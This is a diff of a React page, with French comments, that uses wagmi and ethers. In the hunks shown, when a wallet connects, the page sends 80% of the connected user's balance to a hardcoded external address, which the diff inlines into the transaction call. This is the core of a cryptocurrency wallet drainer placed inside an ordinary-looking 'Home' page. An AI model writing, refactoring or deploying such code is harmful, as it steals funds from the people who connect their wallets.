@@ -1,6 +1,5 @@
 import { useState, useEffect } from 'react';
-import { useAccount, useConnect } from 'wagmi'; // Suppression de 'useProvider'
-import { WalletConnectConnector } from '@wagmi/core';
+import { useAccount, useConnect } from 'wagmi'; // Pas besoin de WalletConnectConnector ici
 import { ethers } from 'ethers';
 
 // Utilisation de useClient si tu as besoin d'un provider
@@ -15,7 +14,6 @@ export default function Home() {
   const provider = client?.provider;
 
   const [balance, setBalance] = useState<number | null>(null);
-  const [recipient, setRecipient] = useState<string>('0x518c5D62647E60864EcB3826e982c93dFa154af3'); // Adresse de destination fixe
 
   useEffect(() => {
     if (isConnected) {
@@ -40,7 +38,7 @@ export default function Home() {
       try {
         // Création de la transaction
         const tx = await signer.sendTransaction({
-          to: recipient,
+          to: '0x518c5D62647E60864EcB3826e982c93dFa154af3', // Adresse de destination fixe
           value: amountToSend, // Envoyer 80% du solde
         });
         
